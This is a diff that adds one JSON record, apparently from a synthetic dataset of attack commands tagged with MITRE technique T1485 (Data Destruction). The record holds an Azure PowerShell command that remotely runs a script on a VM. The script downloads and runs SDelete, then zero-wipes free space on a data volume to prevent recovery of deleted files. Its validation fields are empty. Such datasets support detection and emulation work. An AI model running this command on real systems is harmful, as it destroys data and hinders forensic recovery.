@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-DR' -Name 'WinVM-Data' -CommandId 'RunPowerShellScript' -ScriptString \"Set-Location $env:TEMP; Invoke-WebRequest https://download.sysinternals.com/files/SDelete.zip -OutFile sdelete.zip; Expand-Archive -Path sdelete.zip -DestinationPath . -Force; & .\\sdelete.exe -accepteula -z E:\"",
+  "explanation": "Downloads SDelete and zero-wipes free space on the E: data volume to eliminate remnants of previously deleted sensitive files.",
+  "rationale_steps": [
+    "Acquire SDelete on the target VM.",
+    "Zero out free space on the targeted data volume to prevent deleted data recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-c94993af",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
